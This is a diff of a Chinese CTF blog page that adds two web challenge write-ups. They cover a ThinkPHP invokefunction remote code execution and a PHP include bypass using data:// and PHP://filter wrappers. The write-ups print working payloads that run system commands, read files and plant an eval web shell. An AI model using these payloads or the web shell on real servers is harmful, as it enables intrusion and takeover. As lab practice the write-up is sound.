@@ -35,8 +35,14 @@
 <meta property="og:image" content="http://example.com/2023/04/05/web02/command_execution2.png">
 <meta property="og:image" content="http://example.com/2023/04/05/web02/web21.png">
 <meta property="og:image" content="http://example.com/2023/04/05/web02/web22.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/php_rce1.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/php_rce2.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/php_rce3.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/php_rce4.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/Web_php_include1.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/Web_php_include2.png">
 <meta property="article:published_time" content="2023-04-05T07:30:17.000Z">
-<meta property="article:modified_time" content="2023-06-20T06:16:01.335Z">
+<meta property="article:modified_time" content="2023-06-20T13:22:00.718Z">
 <meta property="article:author" content="想有双手">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2023/04/05/web02/newscenter.png">
@@ -232,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.7k 字
+          6.3k 字
         
       </span>
     
@@ -243,7 +249,7 @@
         
         
         
-          40 分钟
+          53 分钟
         
       </span>
     
@@ -423,6 +429,50 @@
 
 <p>传参即可</p>
 <hr>
+<h3 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h3><p>RCE漏洞</p>
+<p><img src="php_rce1.png" srcset="/img/loading.gif" lazyload alt="php_rce1"></p>
+<p>作为一名合格的<del>脚本小子</del>，正好试试新下的goby，扫描指定ip和port，结果如下：</p>
+<p><img src="php_rce2.png" srcset="/img/loading.gif" lazyload alt="php_rce2"></p>
+<p>goby给出了漏洞的url，直接访问，或者点验证，这里选验证：</p>
+<p><img src="php_rce3.png" srcset="/img/loading.gif" lazyload alt="php_rce3"></p>
+<p>可以看到命令成功执行</p>
+<p>为了方便观察，下面用网页打开，打开url，payload：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure>
+
+<p><img src="php_rce4.png" srcset="/img/loading.gif" lazyload alt="php_rce4"></p>
+<p>可以看到有flag，打开，payload：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=cat%20/flag<br></code></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>ps：既然能rce，何不试试getshell呢</p>
+<p>payload：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://61.147.171.105:54326/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;&gt;11.php</span><br></code></pre></td></tr></table></figure>
+
+<p>蚁剑连一下就好了，确实能getshell，在根目录下有flag</p>
+<p>可以使用find &#x2F; -name flag查找路径~</p>
+<hr>
+<h3 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h3><p>代码审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>乍一看很短，应该是挺简单的，但是转念一想，应该没这么简单</p>
+<p>搜了一下wp，给出的payload为</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>];<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>给出了&#x2F;var&#x2F;www的路径</p>
+<p>再试试</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(ls);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="Web_php_include1.png" srcset="/img/loading.gif" lazyload alt="Web_php_include1"></p>
+<p>既然能执行系统命令，那直接：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="Web_php_include2.png" srcset="/img/loading.gif" lazyload alt="Web_php_include2"></p>
+<p>？怎么没有回显，找了很久的wp，发现，它在注释里，<del>小丑啊啊啊啊</del></p>
+<p>data:&#x2F;&#x2F;伪协议，是数据流封装器，和php:&#x2F;&#x2F;相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过包含你输入的payload来实现目的。</p>
+<h4 id="另一种方法："><a href="#另一种方法：" class="headerlink" title="另一种方法："></a>另一种方法：</h4><p>由于strstr()这个函数对大小写敏感，所以我们可以换成PHP:&#x2F;&#x2F;的形式，pauload：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-variable constant_">PHP</span><span class="hljs-symbol">://filter/convert</span>.base64-encode/resource=fl4gisisish3r3.php<br></code></pre></td></tr></table></figure>
+
+<p>也行</p>
 
                 
               </div>
